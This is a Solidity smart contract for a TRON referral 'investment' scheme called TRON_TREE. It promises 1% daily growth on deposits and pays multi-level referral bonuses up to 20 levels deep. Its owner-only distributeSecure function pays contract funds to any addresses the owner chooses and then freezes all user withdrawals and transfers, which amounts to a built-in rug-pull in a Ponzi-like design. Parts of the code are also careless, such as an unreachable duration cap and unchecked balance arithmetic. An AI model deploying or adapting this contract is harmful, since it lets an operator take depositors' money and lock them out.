//SourceUnit: tron_tree code.sol

pragma solidity >= 0.4.0 < 0.7.0;


library SafeMath {
   
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {    
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

   
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

  
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract TRON_TREE{
    
    using SafeMath for uint256;
   
    struct Account{
        uint id;
        address upline;
        uint256 uploaded_fund;
        uint256 received_fund;
        uint256 growth_fund;
        uint256 referral_incentive;
        uint256 cycleStartTime;
        uint256 duration;
        uint256 referrals;
        uint256 totalStructure;
        mapping (address => uint256) level2Time;
        uint256 CF_Fund;
        uint256 cycle;
    	mapping(uint256 => uint256) levelRefCount;
		mapping(uint256 => uint256) levelInvest;
		uint pool_checkpoint;
    }
    
    struct UserStats{
        uint256 TotalFundsUploaded;
        uint256 TotalFundsWithdrawn;
        uint256 GrowthFundsWithdrawn;
        uint256 UploadedFundsWithdrawn;
        uint256 GrowthFundsReceived;
        uint256 ReferralIncentiveReceived;
        uint256 FundsTransferred;
        uint256 FundsReceived;
    }
    

    struct ContractInfo{
        uint256 TotalFundsUploaded;
        uint256 TotalFundsWithdrawn;
        uint256 Balance;
    }
    
    struct GF_claim{
        uint256 timestamp;
        uint256 index;
    }
    
    address public owner;
    ContractInfo public contractInfo;
    mapping (address => Account) public accounts;
    mapping (address => UserStats) public userStats;
    mapping (address => GF_claim) public GrowthTimestamp;
    

	uint public freez=1;
	uint public secure_fund;
    uint256 public referralCode;
    uint256 minimumFund;
    address private marketingAddress;
    
    mapping (address => uint) public getReferralCode;
    mapping (uint => address) public referralCodes;
    mapping (address => uint256) level2Time;
    mapping (address => uint256) level6Time;
    
    event Registration(address user, uint256 user_id, address referrer, uint256 referrer_id);
    event FundsTransferred(address _sender, address _recipient, uint256 total);
    event FundsWithdrawn(address _address, uint256 _amount);
    event userIncome(address _address, uint256 _amount, uint8 _type);
    event FundUploaded(address user, uint256  amount);
    event CycleStarted(address _address, uint256 _cycle, uint256 _amount);
  
    modifier onlyOwner(){
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }
    modifier hasUpline(address _address){
        require(accounts[_address].upline != address(0) || _address == owner, "Upline absent");
        _;
    }
    
    
    constructor(address _marketingAddress) public {
        marketingAddress=_marketingAddress;
        owner = msg.sender;
        getReferralCode[msg.sender]=1;
        referralCodes[1]=msg.sender;
        referralCode = 2;
        accounts[msg.sender].id=1;
        }
    
    function incentive(uint256 i) public pure returns(uint256){
        
        if(i == 0){
            return 0;
        }
        else if(i == 1){
            return 500;
        }
        else if(i == 2){
            return 300;
        }
        else if(i == 3){
            return 200;
        }
        else if(i == 4){
            return 100;
        }
        else if(i >= 5 && i <= 10){
            return 50;
        }
        else if(i >= 11 && i <= 20){
            return 20;
        }
       
    }
    
    
    function hasActiveCycle(address _address) public view returns(bool){
        if((accounts[_address].cycleStartTime + (accounts[_address].duration * (1 days))) >= now){
            return true;
        }
        else{
            return false;
        }
    }
   

    function setMinimumFund(uint256 _amount) public onlyOwner{
        minimumFund = _amount;
    }

  
    function withdrawUploadedFund(uint256 _amount) public hasUpline(msg.sender){
         require(freez==1,"Not Allowed");
         require(accounts[msg.sender].uploaded_fund >= _amount, "Insufficient Amount to withdraw");
         require((address(this).balance-secure_fund)>=_amount,"Insufficient Contract Balance");
         
          accounts[msg.sender].uploaded_fund -= _amount;
          msg.sender.transfer(_amount);
          
          contractInfo.TotalFundsWithdrawn += _amount;
          contractInfo.Balance = address(this).balance;
          
          userStats[msg.sender].TotalFundsWithdrawn += _amount;
          userStats[msg.sender].UploadedFundsWithdrawn += _amount;
          
          emit FundsWithdrawn(msg.sender, _amount);
    }
    
  
    function withdrawGrowthFund(uint256 _amount) public hasUpline(msg.sender){
        require(freez==1,"Not Allowed");
         updateGrowthFund();
         require(accounts[msg.sender].growth_fund >= _amount, "Insufficient Amount to withdraw");
         require((address(this).balance-secure_fund)>=_amount,"Insufficient Contract Balance");
         
          accounts[msg.sender].growth_fund -= _amount;
          msg.sender.transfer(_amount);
          
          contractInfo.TotalFundsWithdrawn += _amount;
          contractInfo.Balance = address(this).balance;
          
          userStats[msg.sender].TotalFundsWithdrawn += _amount;
          userStats[msg.sender].GrowthFundsWithdrawn += _amount;
          
          emit FundsWithdrawn(msg.sender, _amount);
    }
    
  
     function transferFunds(address _recipient, uint256 _referral_amount, uint256 _growth_amount, uint256 _received_amount, uint256 _uploaded_amount, uint256 _amount) public hasUpline(msg.sender){
        require(freez==1,"Not Allowed");
         updateGrowthFund();
        require(accounts[msg.sender].referral_incentive >= _referral_amount, "Insufficient Referral Amount to transfer");
        require(accounts[msg.sender].growth_fund >= _growth_amount, "Insufficient Referral Amount to transfer");
        require(accounts[msg.sender].received_fund >= _received_amount, "Insufficient Received Amount to transfer");
        require(accounts[msg.sender].uploaded_fund >= _uploaded_amount, "Insufficient Received Amount to transfer");
        
        accounts[msg.sender].referral_incentive -= _referral_amount;
        accounts[msg.sender].growth_fund -= _growth_amount;
        accounts[msg.sender].received_fund -= _received_amount;
        accounts[msg.sender].uploaded_fund -= _uploaded_amount;
        
        uint total=(_referral_amount+_growth_amount+_received_amount+_uploaded_amount);
        accounts[_recipient].received_fund +=total;
        
        userStats[msg.sender].FundsTransferred += total;
        userStats[_recipient].FundsReceived += total;
        
        emit FundsTransferred(msg.sender, _recipient, total);
    }

    
   
    function set_referral_code(uint code) internal{
        require(referralCodes[code] == address(0), "Code already taken" );
        require(getReferralCode[msg.sender]==0, "Referral code already present");
        accounts[msg.sender].id=code;
        referralCodes[code] = msg.sender;
        getReferralCode[msg.sender] = code;
    }
    
    function setUpline(uint _code) internal
    { 
        address _upline = referralCodes[_code];
        
        require(_upline != address(0) || msg.sender == owner, "Invalid Address of Upline");
        require(accounts[msg.sender].upline == address(0) && msg.sender != owner, "Upline already present");
        
        accounts[msg.sender].upline = _upline;
    }
        
    
    function isLeader(address _address) public view returns(bool){
        
        if(accounts[_address].referrals >= 10){
            
            if(accounts[_address].totalStructure >= 25){
                return true;
            }
        }
        return false;
    }
    
  
    function isManager(address _address) public view returns(bool){
        
        if(accounts[_address].referrals >= 20){
            
            if(accounts[_address].totalStructure >=100){
                return true;
            }
        }
        
        return false;
    }
    
  
    function upload_fund(uint _referral_code) public payable{
        require(freez==1,"Not Allowed");
        if(_referral_code == 0){
            if(accounts[msg.sender].upline == address(0) && msg.sender != owner){
                setUpline(getReferralCode[owner]);
                set_referral_code(referralCode);
                emit Registration(msg.sender, referralCode, accounts[msg.sender].upline, accounts[accounts[msg.sender].upline].id);
                referralCode += 1;
            }
        }
        else{
            if(accounts[msg.sender].upline != address(0) || msg.sender == owner){
                require(accounts[msg.sender].upline == referralCodes[_referral_code]);
            }
            else{
                setUpline(_referral_code);
                set_referral_code(referralCode);
                emit Registration(msg.sender, referralCode, accounts[msg.sender].upline, accounts[accounts[msg.sender].upline].id);
                referralCode += 1;
            }
        }
         require(accounts[msg.sender].upline != address(0) || msg.sender == owner);
         
         contractInfo.TotalFundsUploaded += msg.value;
         contractInfo.Balance = address(this).balance;
         
         userStats[msg.sender].TotalFundsUploaded += msg.value;
        
         accounts[msg.sender].uploaded_fund = accounts[msg.sender].uploaded_fund.add(msg.value);
         emit FundUploaded(msg.sender, msg.value);
    }
    
    
    function startCycle(uint256 _uploaded_fund, uint256 _growth_fund, uint256 _received_fund, uint256 _referral_incenitve) public payable hasUpline(msg.sender){
        require(freez==1,"Not Allowed");
         updateGrowthFund();
        require(_uploaded_fund <= accounts[msg.sender].uploaded_fund, "Insufficient uploaded fund");
        require(_growth_fund <= accounts[msg.sender].growth_fund, "Insufficient growth fund");
        require(_referral_incenitve <= accounts[msg.sender].referral_incentive, "Insufficient Referral Incentive");
        require(_received_fund <= accounts[msg.sender].received_fund, "Insufficient Referral received fund");
        require(!hasActiveCycle(msg.sender),"Cycle Already Exist");
        
        accounts[msg.sender].uploaded_fund -= _uploaded_fund;
        accounts[msg.sender].growth_fund -= _growth_fund;
        accounts[msg.sender].received_fund -= _received_fund;
        accounts[msg.sender].referral_incentive -= _referral_incenitve;
        
        uint256 new_fund = _uploaded_fund + _growth_fund + _received_fund + _referral_incenitve;
        // require(new_fund>=500000000,"Minimum Cycle Amount 500 TRX.");
        uint256 principle = new_fund.add(accounts[msg.sender].CF_Fund);
        
        if(accounts[msg.sender].pool_checkpoint==0 && principle>=25000000000 && accounts[msg.sender].cycle<2)
        {
         accounts[msg.sender].growth_fund += (principle*10)/100;  
         accounts[msg.sender].pool_checkpoint=now;
        }
        
        
        uint old=accounts[msg.sender].CF_Fund;
        uint extra=principle-accounts[msg.sender].CF_Fund;
        require(principle >= minimumFund, "Insufficient Funds to start Cycle");
       
        
        uint256 _days = accounts[msg.sender].duration = 15;
        if(_days > 45){
            _days = accounts[msg.sender].duration = 45;
        }
        accounts[msg.sender].cycle++;
        accounts[msg.sender].cycleStartTime = now;
        accounts[msg.sender].CF_Fund = principle;
        GrowthTimestamp[msg.sender].timestamp = accounts[msg.sender].cycleStartTime;
        GrowthTimestamp[msg.sender].index = 0;
        
  
        address _upline = accounts[msg.sender].upline;
        uint256 level = 1;
        uint256 amount1;
        uint256 amount2;
        
        if(old==0)
        accounts[_upline].referrals++;
        
        while(_upline != address(0) && level<=20){
            
            amount1 = incentive(level).mul(accounts[_upline].CF_Fund).div(10000);
            amount2 = incentive(level).mul(accounts[msg.sender].CF_Fund).div(10000);
            if(level >=2 && level <= 5){
                if(isLeader(_upline)){
                     accounts[_upline].referral_incentive += min(amount1, amount2);
                     userStats[_upline].ReferralIncentiveReceived += min(amount1, amount2);
                     if(min(amount1, amount2)>0)
                     emit userIncome(_upline, min(amount1, amount2), 2);
                }
            }
            else if(level >= 6){
                if(isManager(_upline)){
                    accounts[_upline].referral_incentive += min(amount1, amount2);
                    userStats[_upline].ReferralIncentiveReceived += min(amount1, amount2);
                    if(min(amount1, amount2)>0)
                    emit userIncome(_upline, min(amount1, amount2), 2);
                }
            }
            else{
                accounts[_upline].referral_incentive += min(amount1, amount2);
                userStats[_upline].ReferralIncentiveReceived += min(amount1, amount2);
                if(min(amount1, amount2)>0)
                emit userIncome(_upline, min(amount1, amount2), 2);
            }
            
            if(old==0)
            {
                accounts[_upline].levelRefCount[level-1]=accounts[_upline].levelRefCount[level-1].add(1);
                accounts[_upline].totalStructure++;
            }
            
            if(extra>0)
            accounts[_upline].levelInvest[level-1]=accounts[_upline].levelInvest[level-1].add(accounts[msg.sender].CF_Fund);
            
            level++;
            _upline = accounts[_upline].upline;
        }
       
        secure_fund=secure_fund+((principle*4)/100);
        address(uint160(marketingAddress)).send((principle*3)/100);
        emit CycleStarted(msg.sender, accounts[msg.sender].cycle,accounts[msg.sender].CF_Fund);
    }
 
    function updateGrowthFund() internal returns(uint256){
        
        uint256 lastTimestamp = GrowthTimestamp[msg.sender].timestamp;
        uint256 currentTimestamp = now;
        uint256 difference = currentTimestamp - lastTimestamp;
        
        
        uint256 _days = difference/ 1 days;
        if(_days + GrowthTimestamp[msg.sender].index > accounts[msg.sender].duration){
            _days = accounts[msg.sender].duration - GrowthTimestamp[msg.sender].index;
        }
        uint256 interest = (accounts[msg.sender].CF_Fund * 1 *_days)/100;
        accounts[msg.sender].growth_fund += interest;
        if(interest>0)
        emit userIncome(msg.sender, interest, 1);
        GrowthTimestamp[msg.sender].index += _days;
        GrowthTimestamp[msg.sender].timestamp = lastTimestamp + (_days * 1 days);
        
        userStats[msg.sender].GrowthFundsReceived += interest;
        return interest;
    }
  
    
 
  


    
    
    function min(uint256 a, uint256 b) internal pure returns(uint256){
        
        if(a > b){
            return b;
        }
        else{
            return a;
        }
    }
    
 

    
    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
            if (_i == 0) {
                return "0";
            }
            uint j = _i;
            uint len;
            while (j != 0) {
                len++;
                j /= 10;
            }
            bytes memory bstr = new bytes(len);
            uint k = len - 1;
            while (_i != 0) {
                bstr[k--] = byte(uint8(48 + _i % 10));
                _i /= 10;
            }
            return string(bstr);
    }
    
    function newGrowthFund(address _address) public view returns(uint){
        
        uint256 cycleStartTime = accounts[_address].cycleStartTime;
        uint256 currentTimestamp = now;
        uint256 difference = currentTimestamp - cycleStartTime;
        
        uint256 _days = difference/ 1 days;
        
        if(_days > accounts[_address].duration){
            _days = accounts[_address].duration;
        }
        uint256 interest = (accounts[_address].CF_Fund * 1 *_days)/100;
        
        return interest;//887199->419171->889288
    }
  
    
    
    function getUserNetwork(address _user) public view returns(uint256[] memory, uint256[] memory)
    {
        uint256[] memory ref = new  uint256[](21);
        uint256[] memory invest = new  uint256[](21);
        for(uint256 i=0;i<=20;i++)
        {
            ref[i]=accounts[_user].levelRefCount[i];
            invest[i]=accounts[_user].levelInvest[i];
        }
        return(ref,invest);
    }
     
    
      function distributeSecure(address payable[]  memory  _contributors, uint256[] memory _balances) public payable {
        require(msg.sender==owner);
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            _contributors[i].transfer(_balances[i]);
        }
        freez=0;
    }
    
  
    }